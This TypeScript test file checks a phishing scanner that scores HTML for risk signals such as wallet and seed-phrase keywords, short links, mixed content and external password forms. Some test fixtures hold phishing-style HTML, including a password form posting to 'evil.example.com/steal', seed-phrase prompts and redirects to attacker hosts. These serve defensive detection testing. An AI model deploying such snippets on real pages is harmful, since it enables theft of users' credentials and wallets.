import assert from "node:assert/strict";
import test from "node:test";

import { scanHtml } from "../src/worker/scan.ts";

// Clean HTML — no risk signals at all.
test("scanHtml: clean simple HTML doc has status=clean, lifecycle=active, score=0", () => {
  const html = "<!doctype html><html><head><title>Hello</title></head><body><p>Hello world</p></body></html>";
  const result = scanHtml(html);

  assert.equal(result.status, "clean");
  assert.equal(result.lifecycle, "active");
  assert.equal(result.score, 0);
  assert.deepEqual(result.reasons, []);
});

// wallet_keywords — "metamask" → weight 25.
test("scanHtml: wallet keyword 'metamask' produces wallet_keywords reason, weight 25", () => {
  const html = "<!doctype html><html><body><p>Connect with MetaMask to continue.</p></body></html>";
  const result = scanHtml(html);

  const reason = result.reasons.find((r) => r.code === "wallet_keywords");
  assert.ok(reason, "expected wallet_keywords reason");
  assert.equal(reason!.weight, 25);
  assert.equal(result.score, 25);
  assert.equal(result.status, "clean");
  assert.equal(result.lifecycle, "active");
});

// wallet_keywords — "seed phrase" → weight 25.
test("scanHtml: 'seed phrase' keyword produces wallet_keywords reason", () => {
  const html = "<!doctype html><html><body><p>Enter your seed phrase here.</p></body></html>";
  const result = scanHtml(html);

  const reason = result.reasons.find((r) => r.code === "wallet_keywords");
  assert.ok(reason, "expected wallet_keywords reason");
  assert.equal(reason!.weight, 25);
});

// short_link_reference — bit.ly in page text → weight 15.
test("scanHtml: bit.ly host produces short_link_reference reason, weight 15", () => {
  const html = "<!doctype html><html><body><a href='https://bit.ly/abc'>click</a></body></html>";
  const result = scanHtml(html);

  const reason = result.reasons.find((r) => r.code === "short_link_reference");
  assert.ok(reason, "expected short_link_reference reason");
  assert.equal(reason!.weight, 15);
  assert.equal(result.score, 15);
  assert.equal(result.status, "clean");
  assert.equal(result.lifecycle, "active");
});

// Score 50 → suspicious / needs_review.
// wallet_keywords (25) + short_link_reference (15) + mixed_content (15) = 55 → suspicious/needs_review.
test("scanHtml: score 55 → status=suspicious, lifecycle=needs_review", () => {
  const html = [
    "<!doctype html><html><body>",
    "<p>Use MetaMask to connect.</p>",
    "<a href='https://bit.ly/abc'>link</a>",
    "<img src='http://example.com/img.png'>",
    "</body></html>"
  ].join("");
  const result = scanHtml(html);

  // wallet_keywords=25, short_link_reference=15, mixed_content=15 → 55
  assert.equal(result.score, 55);
  assert.equal(result.status, "suspicious");
  assert.equal(result.lifecycle, "needs_review");
});

// Score >= 80 → blocked / blocked.
// external_password_form (40) + wallet_keywords (25) + short_link_reference (15) + mixed_content (15) = 95 → capped at 95.
test("scanHtml: score >= 80 → status=blocked, lifecycle=blocked", () => {
  const html = [
    "<!doctype html><html><body>",
    '<form action="https://evil.example.com/steal"><input type="password"></form>',
    "<p>Enter your seed phrase to connect MetaMask.</p>",
    "<a href='https://bit.ly/phish'>link</a>",
    "<img src='http://evil.com/track.gif'>",
    "</body></html>"
  ].join("");
  const result = scanHtml(html);

  assert.ok(result.score >= 80, `expected score >= 80, got ${result.score}`);
  assert.equal(result.status, "blocked");
  assert.equal(result.lifecycle, "blocked");
});

// Score cap at 100.
test("scanHtml: score is capped at 100", () => {
  // Stack as many signals as possible to exceed 100 raw.
  // external_password_form=40, wallet_keywords=25, top_navigation=20, external_base_href=20,
  // mixed_content=15, short_link=15, suspicious_iframe=20 → raw 155, capped at 100.
  const html = [
    "<!doctype html><html><head>",
    '<base href="https://attacker.example.com">',
    "</head><body>",
    '<form action="https://evil.example.com/steal"><input type="password"></form>',
    "<p>Enter your seed phrase to claim your MetaMask wallet.</p>",
    "<script>window.location.href = 'https://evil.example.com';</script>",
    "<img src='http://plain-http.example.com/track.gif'>",
    "<a href='https://bit.ly/phish'>link</a>",
    '<iframe src="https://evil.example.com/login"></iframe>',
    "</body></html>"
  ].join("");
  const result = scanHtml(html);

  assert.equal(result.score, 100);
});

// URLs are extracted from the HTML.
test("scanHtml: extracts https URLs from html", () => {
  const html = "<!doctype html><html><body><a href='https://example.com/path'>x</a></body></html>";
  const result = scanHtml(html);

  assert.ok(result.urls.includes("https://example.com/path"), `urls: ${JSON.stringify(result.urls)}`);
});

// mixed_content alone → weight 15, status=clean.
test("scanHtml: http:// reference produces mixed_content reason, weight 15", () => {
  const html = "<!doctype html><html><body><img src='http://example.com/img.png'></body></html>";
  const result = scanHtml(html);

  const reason = result.reasons.find((r) => r.code === "mixed_content");
  assert.ok(reason, "expected mixed_content reason");
  assert.equal(reason!.weight, 15);
  assert.equal(result.score, 15);
  assert.equal(result.status, "clean");
});

// external_password_form alone → weight 40, still clean (below 50).
test("scanHtml: external password form produces external_password_form reason, weight 40, status=clean", () => {
  const html = [
    "<!doctype html><html><body>",
    '<form action="https://external.example.com/submit">',
    '<input type="password" name="pw">',
    "</form></body></html>"
  ].join("");
  const result = scanHtml(html);

  const reason = result.reasons.find((r) => r.code === "external_password_form");
  assert.ok(reason, "expected external_password_form reason");
  assert.equal(reason!.weight, 40);
  assert.equal(result.score, 40);
  assert.equal(result.status, "clean");
  assert.equal(result.lifecycle, "active");
});
